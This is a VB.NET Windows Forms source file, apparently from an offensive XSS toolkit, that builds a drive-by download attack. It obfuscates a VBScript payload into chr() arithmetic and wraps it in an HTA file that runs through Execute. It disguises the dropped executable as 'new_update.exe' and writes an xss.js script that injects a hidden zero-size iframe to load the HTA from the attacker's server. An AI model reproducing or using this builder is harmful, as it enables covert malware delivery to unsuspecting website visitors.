Imports System.IO


Public Class xss_hta_driveby

  
    Public Function Encoder(ByVal n As Integer) As String

        Dim r, k As Integer
        Dim ret As String = ""
        r = Int(Rnd() * 10000)
        k = Int(Rnd() * 3)
        If (k = 0) Then
            ret = (r + n) & "-" & r
        End If
        If (k = 1) Then
            ret = (n - r) & "+" & r
        End If

        If (k = 2) Then
            ret = (n * r) & "/" & r
        End If
        Return ret

    End Function

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        On Error Resume Next
        IO.File.Delete("xss.js")
        IO.File.Delete("dwindow.hta")
        IO.File.Delete("new_update.exe")
        Me.Close()
    End Sub

    Private Sub xss_hta_driveby_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        On Error Resume Next
        IO.File.Delete("xss.js")
        IO.File.Delete("dwindow.hta")
        IO.File.Delete("new_update.exe")
        Button1.Enabled = False

        argmnts.Enabled = False
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        If local_file_chkbx.Checked = True Then
            Try
                TextBox1.Text = TextBox1.Text.Replace("XFILEX", "new_update.exe")
                System.IO.File.Copy(TextBox2.Text, Application.StartupPath & "\\new_update.exe")
                TextBox1.Text = TextBox1.Text.Replace("XURLX", "http://" & xss_server.server_ip & "/new_update.exe")
            Catch ee As Exception
                MsgBox(ee.Message.ToString)
                Me.Close()
            End Try
        ElseIf url_chkbox.Checked = True Then
            TextBox1.Text = TextBox1.Text.Replace("XURLX", TextBox4.Text)
            Dim filn As String = Path.GetFileName(TextBox4.Text)
            TextBox1.Text = TextBox1.Text.Replace("XFILEX", filn)
        End If
        Dim qq As String = """"""""""
        If CheckBox1.Checked = False Then
            TextBox1.Text = TextBox1.Text.Replace("XARGSX", "")
        Else
            ' for each argument
            Dim finalarg As String = " & """
            Dim par() As String = argmnts.Text.Split(" ")
            For Each arg As String In par
                finalarg += " " + qq + arg + qq
            Next
            finalarg += """"
            TextBox1.Text = TextBox1.Text.Replace("XARGSX", finalarg)
        End If
        Dim enc As String = ""
        For i = 1 To Len(TextBox1.Text)
            enc = enc & "chr( " & Encoder(Asc(Mid(TextBox1.Text, i, 1))) & " ) & "
        Next

        System.IO.File.WriteAllText(Application.StartupPath & "\dwindow.hta", "<TITLE>IE Window</TITLE><script language='VBScript'> Execute(" & enc & " vbCrLf ) </script>")
        Dim q As String = """"
        Dim streamx As New IO.StreamWriter(Application.StartupPath & "\xss.js")
        streamx.WriteLine("var ifm2=document.createElement('iframe');")
        streamx.WriteLine("ifm2.setAttribute('src','http://" & xss_server.server_ip & "/dwindow.hta'); ifm2.width=0; ifm2.height=0;")
        streamx.WriteLine("document.body.appendChild(ifm2);")
        streamx.Close()
        Button1.Enabled = False
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            argmnts.Enabled = True
        Else
            argmnts.Enabled = False
        End If
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        On Error Resume Next
        OpenFileDialog1.FileName = ""
        OpenFileDialog1.Filter = "Application (*.*)|*.*"
        If OpenFileDialog1.ShowDialog = DialogResult.OK Then
            Button1.Enabled = True
            TextBox2.Text = OpenFileDialog1.FileName

        Else
            Button4.Enabled = False
            TextBox1.Text = ""
        End If
    End Sub

    Private Sub RadioButton1_CheckedChanged(sender As Object, e As EventArgs) Handles url_chkbox.CheckedChanged
        TextBox4.Enabled = True
        TextBox2.Enabled = False
        Button4.Enabled = False




    End Sub

    Private Sub RadioButton2_CheckedChanged(sender As Object, e As EventArgs) Handles local_file_chkbx.CheckedChanged
        TextBox4.Enabled = False
        TextBox2.Enabled = True
        Button4.Enabled = True

    End Sub

    Private Sub TextBox4_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox4.KeyDown
        If TextBox4.Text.StartsWith("http") Then
            Button1.Enabled = True
        End If
    End Sub

    Private Sub TextBox4_TextChanged(sender As Object, e As EventArgs) Handles TextBox4.TextChanged
        If TextBox4.Text.StartsWith("http") Then
            Button1.Enabled = True
        End If
    End Sub

    Private Sub OpenFileDialog1_FileOk(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles OpenFileDialog1.FileOk

    End Sub
End Class